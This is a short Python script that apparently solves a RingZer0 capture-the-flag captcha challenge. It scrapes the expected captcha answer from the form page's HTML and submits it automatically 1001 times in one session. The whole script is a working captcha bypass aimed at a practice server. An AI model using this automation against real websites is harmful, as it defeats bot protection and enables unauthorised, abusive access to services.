#!/usr/bin/env python3

import http.client
import urllib.parse

conn = http.client.HTTPConnection("challenges.ringzer0team.com:10138")
conn.request("GET", "/form1.php")
resp = conn.getresponse()
session_id = resp.headers["Set-Cookie"].split(";")[0].split("=")[1]
body = resp.read()

headers = {
    "Cookie": "PHPSESSID=" + session_id,
    "Content-Type": "application/x-www-form-urlencoded"
}

for _ in range(1001):
    conn.request("GET", "/form1.php", None, headers)
    resp = conn.getresponse()
    body = resp.read()
    captcha = body.decode().split("\n")[40].split('"')[1]

    conn.request("GET", "/captcha/captchabroken.php?new", None, headers)
    resp = conn.getresponse()
    body = resp.read()

    params = urllib.parse.urlencode({
        "captcha": captcha
    })
    conn.request("POST", "/captcha1.php", params, headers)
    resp = conn.getresponse()
    body = resp.read()
    print(body)

conn.close()
